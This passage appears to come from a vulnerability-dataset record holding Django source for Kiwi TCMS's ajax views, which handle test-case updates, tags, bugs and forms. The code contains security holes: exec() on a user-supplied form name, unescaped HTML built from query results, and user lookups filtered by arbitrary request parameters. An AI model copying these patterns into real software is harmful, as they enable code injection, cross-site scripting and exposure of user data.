'log_action'): for t in targets: try: t.log_action( who=request.user, action='Field{} changed from{} to{}.'.format( field, getattr(t, field), TestCaseRunStatus.id_to_string(value), ) ) except(AttributeError, User.DoesNotExist): pass objects_update(targets, **{field: value}) if hasattr(model, 'mail_scene'): from tcms.core.utils.mailto import mailto mail_context=model.mail_scene( objects=targets, field=field, value=value, ctype=ctype, object_pk=object_pk, ) if mail_context: mail_context['context']['user']=request.user try: mailto(**mail_context) except Exception: pass if ctype=='testruns.testcaserun' and field=='case_run_status': for t in targets: field='close_date' t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), now ) ) if t.tested_by !=request.user: field='tested_by' t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), request.user ) ) field='assignee' try: assignee=t.assginee if assignee !=request.user: t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), request.user ) ) t.save() except(AttributeError, User.DoesNotExist): pass targets.update(close_date=now, tested_by=request.user) return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'})) class ModelUpdateActions(object): \"\"\"Abstract class defining interfaces to update a model properties\"\"\" class TestCaseUpdateActions(ModelUpdateActions): \"\"\"Actions to update each possible proprety of TestCases Define your own method named _update_[property name] to hold specific update logic. \"\"\" ctype='testcases.testcase' def __init__(self, request): self.request=request self.target_field=request.POST.get('target_field') self.new_value=request.POST.get('new_value') def get_update_action(self): return getattr(self, '_update_%s' % self.target_field, None) def update(self): has_perms=check_permission(self.request, self.ctype) if not has_perms: return say_no(\"You don't have enough permission to update TestCases.\") action=self.get_update_action() if action is not None: try: resp=action() self._sendmail() except ObjectDoesNotExist as err: return say_no(str(err)) except Exception: return say_no('Update failed. Please try again or request ' 'support from your organization.') else: if resp is None: resp=say_yes() return resp return say_no('Not know what to update.') def get_update_targets(self): \"\"\"Get selected cases to update their properties\"\"\" case_ids=map(int, self.request.POST.getlist('case')) self._update_objects=TestCase.objects.filter(pk__in=case_ids) return self._update_objects def get_plan(self, pk_enough=True): try: return plan_from_request_or_none(self.request, pk_enough) except Http404: return None def _sendmail(self): mail_context=TestCase.mail_scene(objects=self._update_objects, field=self.target_field, value=self.new_value) if mail_context: from tcms.core.utils.mailto import mailto mail_context['context']['user']=self.request.user try: mailto(**mail_context) except Exception: pass def _update_priority(self): exists=Priority.objects.filter(pk=self.new_value).exists() if not exists: raise ObjectDoesNotExist('The priority you specified to change ' 'does not exist.') self.get_update_targets().update(**{str(self.target_field): self.new_value}) def _update_default_tester(self): try: user=User.objects.get(Q(username=self.new_value) | Q(email=self.new_value)) except User.DoesNotExist: raise ObjectDoesNotExist('Default tester not found!') self.get_update_targets().update(**{str(self.target_field): user.pk}) def _update_case_status(self): try: new_status=TestCaseStatus.objects.get(pk=self.new_value) except TestCaseStatus.DoesNotExist: raise ObjectDoesNotExist('The status you choose does not exist.') update_object=self.get_update_targets() if not update_object: return say_no('No record(s) found') for testcase in update_object: if hasattr(testcase, 'log_action'): testcase.log_action( who=self.request.user, action='Field %s changed from %s to %s.' %( self.target_field, testcase.case_status, new_status.name ) ) update_object.update(**{str(self.target_field): self.new_value}) try: plan=plan_from_request_or_none(self.request) except Http404: return say_no(\"No plan record found.\") else: if plan is None: return say_no('No plan record found.') confirm_status_name='CONFIRMED' plan.run_case=plan.case.filter(case_status__name=confirm_status_name) plan.review_case=plan.case.exclude(case_status__name=confirm_status_name) run_case_count=plan.run_case.count() case_count=plan.case.count() review_case_count=plan.review_case.count() return http.JsonResponse({ 'rc': 0, 'response': 'ok', 'run_case_count': run_case_count, 'case_count': case_count, 'review_case_count': review_case_count, }) def _update_sortkey(self): try: sortkey=int(self.new_value) if sortkey < 0 or sortkey > 32300: return say_no('New sortkey is out of range[0, 32300].') except ValueError: return say_no('New sortkey is not an integer.') plan=plan_from_request_or_none(self.request, pk_enough=True) if plan is None: return say_no('No plan record found.') update_targets=self.get_update_targets() offset=0 step_length=500 queryset_filter=TestCasePlan.objects.filter data={self.target_field: sortkey} while 1: sub_cases=update_targets[offset:offset +step_length] case_pks=[case.pk for case in sub_cases] if len(case_pks)==0: break queryset_filter(plan=plan, case__in=case_pks).update(**data) offset +=step_length def _update_reviewer(self): reviewers=User.objects.filter(username=self.new_value).values_list('pk', flat=True) if not reviewers: err_msg='Reviewer %s is not found' % self.new_value raise ObjectDoesNotExist(err_msg) self.get_update_targets().update(**{str(self.target_field): reviewers[0]}) @require_POST def update_cases_default_tester(request): \"\"\"Update default tester upon selected TestCases\"\"\" proxy=TestCaseUpdateActions(request) return proxy.update() update_cases_priority=update_cases_default_tester update_cases_case_status=update_cases_default_tester update_cases_sortkey=update_cases_default_tester update_cases_reviewer=update_cases_default_tester @require_POST def comment_case_runs(request): \"\"\" Add comment to one or more caseruns at a time. \"\"\" data=request.POST.copy() comment=data.get('comment', None) if not comment: return say_no('Comments needed') run_ids=[i for i in data.get('run', '').split(',') if i] if not run_ids: return say_no('No runs selected.') runs=TestCaseRun.objects.filter(pk__in=run_ids).only('pk') if not runs: return say_no('No caserun found.') add_comment(runs, comment, request.user) return say_yes() def clean_bug_form(request): \"\"\" Verify the form data, return a tuple\\n (None, ERROR_MSG) on failure\\n or\\n (data_dict, '') on success.\\n \"\"\" data={} try: data['bugs']=request.GET.get('bug_id', '').split(',') data['runs']=map(int, request.GET.get('case_runs', '').split(',')) except(TypeError, ValueError) as e: return(None, 'Please specify only integers for bugs, ' 'caseruns(using comma to seperate IDs), ' 'and bug_system.(DEBUG INFO: %s)' % str(e)) data['bug_system_id']=int(request.GET.get('bug_system_id', 1)) if request.GET.get('a') not in('add', 'remove'): return(None, 'Actions only allow \"add\" and \"remove\".') else: data['action']=request.GET.get('a') data['bz_external_track']=True if request.GET.get('bz_external_track', False) else False return(data, '') def update_bugs_to_caseruns(request): \"\"\" Add one or more bugs to or remove that from\\n one or more caserun at a time. \"\"\" data, error=clean_bug_form(request) if error: return say_no(error) runs=TestCaseRun.objects.filter(pk__in=data['runs']) bug_system_id=data['bug_system_id'] bug_ids=data['bugs'] try: validate_bug_id(bug_ids, bug_system_id) except ValidationError as e: return say_no(str(e)) bz_external_track=data['bz_external_track'] action=data['action'] try: if action==\"add\": for run in runs: for bug_id in bug_ids: run.add_bug(bug_id=bug_id, bug_system_id=bug_system_id, bz_external_track=bz_external_track) else: bugs=Bug.objects.filter(bug_id__in=bug_ids) for run in runs: for bug in bugs: if bug.case_run_id==run.pk: run.remove_bug(bug.bug_id, run.pk) except Exception as e: return say_no(str(e)) return say_yes() def get_prod_related_objs(p_pks, target): \"\"\" Get Component, Version, Category, and Build\\n Return[(id, name),(id, name)] \"\"\" ctypes={ 'component':(Component, 'name'), 'version':(Version, 'value'), 'build':(Build, 'name'), 'category':(Category, 'name'), } results=ctypes[target][0]._default_manager.filter(product__in=p_pks) attr=ctypes[target][1] results=[(r.pk, getattr(r, attr)) for r in results] return results def get_prod_related_obj_json(request): \"\"\" View for updating product drop-down\\n in a Ajax way. \"\"\" data=request.GET.copy() target=data.get('target', None) p_pks=data.get('p_ids', None) sep=data.get('sep', None) if target and p_pks and sep: p_pks=[k for k in p_pks.split(sep) if k] res=get_prod_related_objs(p_pks, target) else: res=[] return HttpResponse(json.dumps(res)) def objects_update(objects, **kwargs): objects.update(**kwargs) kwargs['instances']=objects if objects.model.__name__==TestCaseRun.__name__ and kwargs.get( 'case_run_status', None): POST_UPDATE_SIGNAL.send(sender=None, **kwargs) ", "sourceWithComments": "# -*- coding: utf-8 -*-\n\"\"\"\nShared functions for plan/case/run.\n\nMost of these functions are use for Ajax.\n\"\"\"\nimport datetime\nimport sys\nimport json\nfrom distutils.util import strtobool\n\nfrom django import http\nfrom django.db.models import Q, Count\nfrom django.contrib.auth.models import User\nfrom django.core import serializers\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.apps import apps\nfrom django.forms import ValidationError\nfrom django.http import Http404\nfrom django.http import HttpResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.http import require_GET\nfrom django.views.decorators.http import require_POST\n\nfrom tcms.signals import POST_UPDATE_SIGNAL\nfrom tcms.management.models import Component, Build, Version\nfrom tcms.management.models import Priority\nfrom tcms.management.models import Tag\nfrom tcms.management.models import EnvGroup, EnvProperty, EnvValue\nfrom tcms.testcases.models import TestCase, Bug\nfrom tcms.testcases.models import Category\nfrom tcms.testcases.models import TestCaseStatus, TestCaseTag\nfrom tcms.testcases.views import plan_from_request_or_none\nfrom tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag\nfrom tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag\nfrom tcms.core.helpers.comments import add_comment\nfrom tcms.core.utils.validations import validate_bug_id\n\n\ndef check_permission(request, ctype):\n    perm = '%s.change_%s' % tuple(ctype.split('.'))\n    if request.user.has_perm(perm):\n        return True\n    return False\n\n\ndef strip_parameters(request_dict, skip_parameters):\n    parameters = {}\n    for key, value in request_dict.items():\n        if key not in skip_parameters and value:\n            parameters[str(key)] = value\n\n    return parameters\n\n\n@require_GET\ndef info(request):\n    \"\"\"Ajax responder for misc information\"\"\"\n\n    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))\n    info_type = getattr(objects, request.GET.get('info_type'))\n\n    if not info_type:\n        return HttpResponse('Unrecognizable info-type')\n\n    if request.GET.get('format') == 'ulli':\n        field = request.GET.get('field', default='name')\n\n        response_str = '<ul>'\n        for obj_value in info_type().values(field):\n            response_str += '<li>' + obj_value.get(field, None) + '</li>'\n        response_str += '</ul>'\n\n        return HttpResponse(response_str)\n\n    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))\n\n\nclass _InfoObjects(object):\n\n    def __init__(self, request, product_id=None):\n        self.request = request\n        try:\n            self.product_id = int(product_id)\n        except (ValueError, TypeError):\n            self.product_id = 0\n\n    def builds(self):\n        try:\n            is_active = strtobool(self.request.GET.get('is_active', default='False'))\n        except (ValueError, TypeError):\n            is_active = False\n\n        return Build.objects.filter(product_id=self.product_id, is_active=is_active)\n\n    def categories(self):\n        return Category.objects.filter(product__id=self.product_id)\n\n    def components(self):\n        return Component.objects.filter(product__id=self.product_id)\n\n    def env_groups(self):\n        return EnvGroup.objects.all()\n\n    def env_properties(self):\n        if self.request.GET.get('env_group_id'):\n            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()\n        return EnvProperty.objects.all()\n\n    def env_values(self):\n        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))\n\n    def users(self):\n        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))\n        return User.objects.filter(**query)\n\n    def versions(self):\n        return Version.objects.filter(product__id=self.product_id)\n\n\n@require_GET\ndef form(request):\n    \"\"\"Response get form ajax call, most using in dialog\"\"\"\n\n    # The parameters in internal_parameters will delete from parameters\n    internal_parameters = ['app_form', 'format']\n    parameters = strip_parameters(request.GET, internal_parameters)\n    q_app_form = request.GET.get('app_form')\n    q_format = request.GET.get('format')\n    if not q_format:\n        q_format = 'p'\n\n    if not q_app_form:\n        return HttpResponse('Unrecognizable app_form')\n\n    # Get the form\n    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]\n    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))\n    __import__('tcms.%s.forms' % q_app)\n    q_app_module = sys.modules['tcms.%s.forms' % q_app]\n    form_class = getattr(q_app_module, q_form)\n    form_params = form_class(initial=parameters)\n\n    # Generate the HTML and reponse\n    html = getattr(form_params, 'as_' + q_format)\n    return HttpResponse(html())\n\n\ndef tags(request):\n    \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\"\n\n    tag_objects = _TagObjects(request)\n    template_name, obj = tag_objects.get()\n\n    q_tag = request.GET.get('tags')\n    q_action = request.GET.get('a')\n\n    if q_action:\n        tag_actions = _TagActions(obj=obj, tag_name=q_tag)\n        getattr(tag_actions, q_action)()\n\n    all_tags = obj.tag.all().order_by('pk')\n    test_plan_tags = TestPlanTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')\n    test_case_tags = TestCaseTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')\n    test_run_tags = TestRunTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')\n\n    plan_counter = _TagCounter('num_plans', test_plan_tags)\n    case_counter = _TagCounter('num_cases', test_case_tags)\n    run_counter = _TagCounter('num_runs', test_run_tags)\n\n    for tag in all_tags:\n        tag.num_plans = plan_counter.calculate_tag_count(tag)\n        tag.num_cases = case_counter.calculate_tag_count(tag)\n        tag.num_runs = run_counter.calculate_tag_count(tag)\n\n    context_data = {\n        'tags': all_tags,\n        'object': obj,\n    }\n    return render(request, template_name, context_data)\n\n\nclass _TagObjects(object):\n    \"\"\" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database \"\"\"\n\n    def __init__(self, request):\n        \"\"\"\n        :param request: An HTTP GET request, containing the primary key\n                        and the type of object to be selected\n        :type request: HttpRequest\n        \"\"\"\n        for obj in ['plan', 'case', 'run']:\n            if request.GET.get(obj):\n                self.object = obj\n                self.object_pk = request.GET.get(obj)\n                break\n\n    def get(self):\n        func = getattr(self, self.object)\n        return func()\n\n    def plan(self):\n        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)\n\n    def case(self):\n        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)\n\n    def run(self):\n        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)\n\n\nclass _TagActions(object):\n    \"\"\" Used for performing the 'add' and 'remove' actions on a given tag \"\"\"\n\n    def __init__(self, obj, tag_name):\n        \"\"\"\n        :param obj: the object for which the tag actions would be performed\n        :type obj: either a :class:`tcms.testplans.models.TestPlan`,\n                          a :class:`tcms.testcases.models.TestCase` or\n                          a :class:`tcms.testruns.models.TestRun`\n        :param tag_name: The name of the tag to be manipulated\n        :type tag_name: str\n        \"\"\"\n        self.obj = obj\n        self.tag_name = tag_name\n\n    def add(self):\n        tag, _ = Tag.objects.get_or_create(name=self.tag_name)\n        self.obj.add_tag(tag)\n\n    def remove(self):\n        tag = Tag.objects.get(name=self.tag_name)\n        self.obj.remove_tag(tag)\n\n\nclass _TagCounter(object):\n    \"\"\" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan \"\"\"\n\n    def __init__(self, key, test_tags):\n        \"\"\"\n         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count\n         :type key: str\n         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and\n                            annotated by key\n            e.g. TestPlanTag, TestCaseTag ot TestRunTag\n         :type test_tags: QuerySet\n        \"\"\"\n        self.key = key\n        self.test_tags = iter(test_tags)\n        self.counter = {'tag': 0}\n\n    def calculate_tag_count(self, tag):\n        \"\"\"\n        :param tag: the tag you do the counting for\n        :type tag: :class:`tcms.management.models.Tag`\n        :return: the number of times a tag is assigned to object\n        :rtype: int\n        \"\"\"\n        if self.counter['tag'] != tag.pk:\n            try:\n                self.counter = self.test_tags.__next__()\n            except StopIteration:\n                return 0\n\n        if tag.pk == self.counter['tag']:\n            return self.counter[self.key]\n        return 0\n\n\ndef get_value_by_type(val, v_type):\n    \"\"\"\n    Exampls:\n    1. get_value_by_type('True', 'bool')\n    (1, None)\n    2. get_value_by_type('19860624 123059', 'datetime')\n    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)\n    3. get_value_by_type('5', 'int')\n    ('5', None)\n    4. get_value_by_type('string', 'str')\n    ('string', None)\n    5. get_value_by_type('everything', 'None')\n    (None, None)\n    6. get_value_by_type('buggy', 'buggy')\n    (None, 'Unsupported value type.')\n    7. get_value_by_type('string', 'int')\n    (None, \"invalid literal for int() with base 10: 'string'\")\n    \"\"\"\n    value = error = None\n\n    def get_time(time):\n        date_time = datetime.datetime\n        if time == 'NOW':\n            return date_time.now()\n        return date_time.strptime(time, '%Y%m%d %H%M%S')\n\n    pipes = {\n        # Temporary solution is convert all of data to str\n        # 'bool': lambda x: x == 'True',\n        'bool': lambda x: x == 'True' and 1 or 0,\n        'datetime': get_time,\n        'int': lambda x: str(int(x)),\n        'str': lambda x: str(x),\n        'None': lambda x: None,\n    }\n    pipe = pipes.get(v_type, None)\n    if pipe is None:\n        error = 'Unsupported value type.'\n    else:\n        try:\n            value = pipe(val)\n        except Exception as e:\n            error = str(e)\n    return value, error\n\n\ndef say_no(error_msg):\n    ajax_response = {'rc': 1, 'response': error_msg}\n    return HttpResponse(json.dumps(ajax_response))\n\n\ndef say_yes():\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\n# Deprecated. Not flexible.\n@require_POST\ndef update(request):\n    \"\"\"\n    Generic approach to update a model,\\n\n    based on contenttype.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), value\n                    )\n                )\n            except (AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n    return say_yes()\n\n\n@require_POST\ndef update_case_run_status(request):\n    \"\"\"\n    Update Case Run status.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field {} changed from {} to {}.'.format(\n                        field,\n                        getattr(t, field),\n                        TestCaseRunStatus.id_to_string(value),\n                    )\n                )\n            except (AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        from tcms.core.utils.mailto import mailto\n\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\nclass ModelUpdateActions(object):\n    \"\"\"Abstract class defining interfaces to update a model properties\"\"\"\n\n\nclass TestCaseUpdateActions(ModelUpdateActions):\n    \"\"\"Actions to update each possible proprety of TestCases\n\n    Define your own method named _update_[property name] to hold specific\n    update logic.\n    \"\"\"\n\n    ctype = 'testcases.testcase'\n\n    def __init__(self, request):\n        self.request = request\n        self.target_field = request.POST.get('target_field')\n        self.new_value = request.POST.get('new_value')\n\n    def get_update_action(self):\n        return getattr(self, '_update_%s' % self.target_field, None)\n\n    def update(self):\n        has_perms = check_permission(self.request, self.ctype)\n        if not has_perms:\n            return say_no(\"You don't have enough permission to update TestCases.\")\n\n        action = self.get_update_action()\n        if action is not None:\n            try:\n                resp = action()\n                self._sendmail()\n            except ObjectDoesNotExist as err:\n                return say_no(str(err))\n            except Exception:\n                # TODO: besides this message to users, what happening should be\n                # recorded in the system log.\n                return say_no('Update failed. Please try again or request '\n                              'support from your organization.')\n            else:\n                if resp is None:\n                    resp = say_yes()\n                return resp\n        return say_no('Not know what to update.')\n\n    def get_update_targets(self):\n        \"\"\"Get selected cases to update their properties\"\"\"\n        case_ids = map(int, self.request.POST.getlist('case'))\n        self._update_objects = TestCase.objects.filter(pk__in=case_ids)\n        return self._update_objects\n\n    def get_plan(self, pk_enough=True):\n        try:\n            return plan_from_request_or_none(self.request, pk_enough)\n        except Http404:\n            return None\n\n    def _sendmail(self):\n        mail_context = TestCase.mail_scene(objects=self._update_objects,\n                                           field=self.target_field,\n                                           value=self.new_value)\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = self.request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    def _update_priority(self):\n        exists = Priority.objects.filter(pk=self.new_value).exists()\n        if not exists:\n            raise ObjectDoesNotExist('The priority you specified to change '\n                                     'does not exist.')\n        self.get_update_targets().update(**{str(self.target_field): self.new_value})\n\n    def _update_default_tester(self):\n        try:\n            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))\n        except User.DoesNotExist:\n            raise ObjectDoesNotExist('Default tester not found!')\n        self.get_update_targets().update(**{str(self.target_field): user.pk})\n\n    def _update_case_status(self):\n        try:\n            new_status = TestCaseStatus.objects.get(pk=self.new_value)\n        except TestCaseStatus.DoesNotExist:\n            raise ObjectDoesNotExist('The status you choose does not exist.')\n\n        update_object = self.get_update_targets()\n        if not update_object:\n            return say_no('No record(s) found')\n\n        for testcase in update_object:\n            if hasattr(testcase, 'log_action'):\n                testcase.log_action(\n                    who=self.request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        self.target_field, testcase.case_status, new_status.name\n                    )\n                )\n        update_object.update(**{str(self.target_field): self.new_value})\n\n        # ###\n        # Case is moved between Cases and Reviewing Cases tabs accoding to the\n        # change of status. Meanwhile, the number of cases with each status\n        # should be updated also.\n\n        try:\n            plan = plan_from_request_or_none(self.request)\n        except Http404:\n            return say_no(\"No plan record found.\")\n        else:\n            if plan is None:\n                return say_no('No plan record found.')\n\n        confirm_status_name = 'CONFIRMED'\n        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)\n        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)\n        run_case_count = plan.run_case.count()\n        case_count = plan.case.count()\n        # FIXME: why not calculate review_case_count or run_case_count by using\n        # substraction, which saves one SQL query.\n        review_case_count = plan.review_case.count()\n\n        return http.JsonResponse({\n            'rc': 0, 'response': 'ok',\n            'run_case_count': run_case_count,\n            'case_count': case_count,\n            'review_case_count': review_case_count,\n        })\n\n    def _update_sortkey(self):\n        try:\n            sortkey = int(self.new_value)\n            if sortkey < 0 or sortkey > 32300:\n                return say_no('New sortkey is out of range [0, 32300].')\n        except ValueError:\n            return say_no('New sortkey is not an integer.')\n        plan = plan_from_request_or_none(self.request, pk_enough=True)\n        if plan is None:\n            return say_no('No plan record found.')\n        update_targets = self.get_update_targets()\n\n        # ##\n        # MySQL does not allow to exeucte UPDATE statement that contains\n        # subquery querying from same table. In this case, OperationError will\n        # be raised.\n        offset = 0\n        step_length = 500\n        queryset_filter = TestCasePlan.objects.filter\n        data = {self.target_field: sortkey}\n        while 1:\n            sub_cases = update_targets[offset:offset + step_length]\n            case_pks = [case.pk for case in sub_cases]\n            if len(case_pks) == 0:\n                break\n            queryset_filter(plan=plan, case__in=case_pks).update(**data)\n            # Move to next batch of cases to change.\n            offset += step_length\n\n    def _update_reviewer(self):\n        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)\n        if not reviewers:\n            err_msg = 'Reviewer %s is not found' % self.new_value\n            raise ObjectDoesNotExist(err_msg)\n        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})\n\n\n# NOTE: what permission is necessary\n# FIXME: find a good chance to map all TestCase property change request to this\n@require_POST\ndef update_cases_default_tester(request):\n    \"\"\"Update default tester upon selected TestCases\"\"\"\n    proxy = TestCaseUpdateActions(request)\n    return proxy.update()\n\n\nupdate_cases_priority = update_cases_default_tester\nupdate_cases_case_status = update_cases_default_tester\nupdate_cases_sortkey = update_cases_default_tester\nupdate_cases_reviewer = update_cases_default_tester\n\n\n@require_POST\ndef comment_case_runs(request):\n    \"\"\"\n    Add comment to one or more caseruns at a time.\n    \"\"\"\n    data = request.POST.copy()\n    comment = data.get('comment', None)\n    if not comment:\n        return say_no('Comments needed')\n    run_ids = [i for i in data.get('run', '').split(',') if i]\n    if not run_ids:\n        return say_no('No runs selected.')\n    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')\n    if not runs:\n        return say_no('No caserun found.')\n    add_comment(runs, comment, request.user)\n    return say_yes()\n\n\ndef clean_bug_form(request):\n    \"\"\"\n    Verify the form data, return a tuple\\n\n    (None, ERROR_MSG) on failure\\n\n    or\\n\n    (data_dict, '') on success.\\n\n    \"\"\"\n    data = {}\n    try:\n        data['bugs'] = request.GET.get('bug_id', '').split(',')\n        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))\n    except (TypeError, ValueError) as e:\n        return (None, 'Please specify only integers for bugs, '\n                      'caseruns(using comma to seperate IDs), '\n                      'and bug_system. (DEBUG INFO: %s)' % str(e))\n\n    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))\n\n    if request.GET.get('a') not in ('add', 'remove'):\n        return (None, 'Actions only allow \"add\" and \"remove\".')\n    else:\n        data['action'] = request.GET.get('a')\n    data['bz_external_track'] = True if request.GET.get('bz_external_track',\n                                                        False) else False\n\n    return (data, '')\n\n\ndef update_bugs_to_caseruns(request):\n    \"\"\"\n    Add one or more bugs to or remove that from\\n\n    one or more caserun at a time.\n    \"\"\"\n    data, error = clean_bug_form(request)\n    if error:\n        return say_no(error)\n    runs = TestCaseRun.objects.filter(pk__in=data['runs'])\n    bug_system_id = data['bug_system_id']\n    bug_ids = data['bugs']\n\n    try:\n        validate_bug_id(bug_ids, bug_system_id)\n    except ValidationError as e:\n        return say_no(str(e))\n\n    bz_external_track = data['bz_external_track']\n    action = data['action']\n    try:\n        if action == \"add\":\n            for run in runs:\n                for bug_id in bug_ids:\n                    run.add_bug(bug_id=bug_id,\n                                bug_system_id=bug_system_id,\n                                bz_external_track=bz_external_track)\n        else:\n            bugs = Bug.objects.filter(bug_id__in=bug_ids)\n            for run in runs:\n                for bug in bugs:\n                    if bug.case_run_id == run.pk:\n                        run.remove_bug(bug.bug_id, run.pk)\n    except Exception as e:\n        return say_no(str(e))\n    return say_yes()\n\n\ndef get_prod_related_objs(p_pks, target):\n    \"\"\"\n    Get Component, Version, Category, and Build\\n\n    Return [(id, name), (id, name)]\n    \"\"\"\n    ctypes = {\n        'component': (Component, 'name'),\n        'version': (Version, 'value'),\n        'build': (Build, 'name'),\n        'category': (Category, 'name'),\n    }\n    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)\n    attr = ctypes[target][1]\n    results = [(r.pk, getattr(r, attr)) for r in results]\n    return results\n\n\ndef get_prod_related_obj_json(request):\n    \"\"\"\n    View for updating product 